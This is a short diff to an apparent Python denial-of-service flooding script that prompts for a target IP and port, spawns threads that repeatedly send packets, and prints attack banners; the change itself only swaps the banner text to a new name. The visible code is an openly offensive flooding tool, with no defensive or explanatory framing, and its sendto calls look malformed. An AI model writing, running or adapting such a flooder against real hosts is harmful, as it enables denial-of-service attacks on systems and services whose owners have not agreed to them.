@@ -5,7 +5,7 @@ import random
 import threading
 import os,sys
 
-print("UBAH SERAH KALIAN")
+print("ZHUANX NIHH BOOSS")
 
 ip_wibu = str(input("Ip Target : "))
 port_wibu = int(input("Port Target : "))
@@ -22,9 +22,9 @@ def wibu():
             s.sendto(asu)
             for x in range(paket_wibu):
                 s.sendto(asu)
-            print("[•] WIBU ATTACK!!!")
+            print("[•] ZHUANX ATTACK!!!")
         except:
-            print("[•] WIBU ATTACK!!!")
+            print("[•] ZHUANX ATTACK!!!")
 
 for y in range(threads_wibu):
     th = threading.Thread(target=wibu)
